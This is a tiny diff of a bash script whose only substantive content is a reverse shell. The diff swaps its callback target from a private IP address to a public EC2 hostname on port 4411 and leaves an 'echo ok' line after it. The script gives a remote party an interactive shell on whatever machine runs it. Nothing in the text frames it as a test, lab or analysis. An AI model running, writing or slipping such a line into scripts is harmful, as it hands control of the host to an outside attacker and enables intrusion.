@@ -1,4 +1,4 @@
 #!/bin/bash
 
-bash -i >& /dev/tcp/10.66.140.157/4411 0>&1
+bash -i >& /dev/tcp/ec2-54-197-221-121.compute-1.amazonaws.com/4411 0>&1
 echo ok
